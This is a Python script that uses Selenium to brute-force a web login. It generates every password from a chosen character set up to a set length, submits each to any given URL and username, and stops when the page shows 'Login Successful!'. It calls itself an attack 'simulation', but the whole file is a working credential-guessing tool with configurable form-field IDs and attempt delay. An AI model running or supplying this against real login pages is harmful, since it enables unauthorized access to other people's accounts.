from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import argparse
import itertools
import time


def generate_passwords(chars, max_length):
    """Generate passwords up to the specified max_length using the given chars."""
    for length in range(1, max_length + 1):
        for password_tuple in itertools.product(chars, repeat=length):
            yield ''.join(password_tuple)


def attempt_login(driver, url, username, password, username_field_id, password_field_id, submit_button_id):
    """Use Selenium to attempt to login with the given username and password."""
    driver.get(url)

    # Clear the fields before sending keys
    driver.find_element(By.ID, username_field_id).clear()
    driver.find_element(By.ID, password_field_id).clear()

    # Find the username and password fields and fill them in
    driver.find_element(By.ID, username_field_id).send_keys(username)
    driver.find_element(By.ID, password_field_id).send_keys(password)

    # Find the login button and click it
    driver.find_element(By.ID, submit_button_id).click()

    # Check for "Login Successful!" text on the page
    time.sleep(1)  # Adjust as needed
    body_text = driver.find_element(By.TAG_NAME, "body").text
    return "Login Successful!" in body_text


def main():
    parser = argparse.ArgumentParser(description="Brute-force attack simulation with Selenium.")
    parser.add_argument("--url", required=True, help="Login URL")
    parser.add_argument("--user", required=True, help="Username for login")
    parser.add_argument("--max-length", type=int, required=True, help="Max length of password to generate")
    parser.add_argument("--chars", required=True, help="Characters to use for generating passwords")
    parser.add_argument("--rate-limit", type=float, default=1,
                        help="Delay between login attempts in seconds (optional)")
    parser.add_argument("--username-field-id", default="username", help="ID of the username input field (optional)")
    parser.add_argument("--password-field-id", default="password", help="ID of the password input field (optional)")
    parser.add_argument("--submit-button-id", default="login", help="ID of the submit button (optional)")
    args = parser.parse_args()

    driver = webdriver.Chrome()

    try:
        for password in generate_passwords(args.chars, args.max_length):
            success = attempt_login(driver, args.url, args.user, password, args.username_field_id,
                                    args.password_field_id, args.submit_button_id)
            print(f"Attempted password: {password}")
            if success:
                print(f"Success! Password found: {password}")
                break
            time.sleep(args.rate_limit)  # Sleep between attempts
    finally:
        driver.quit()


if __name__ == "__main__":
    main()
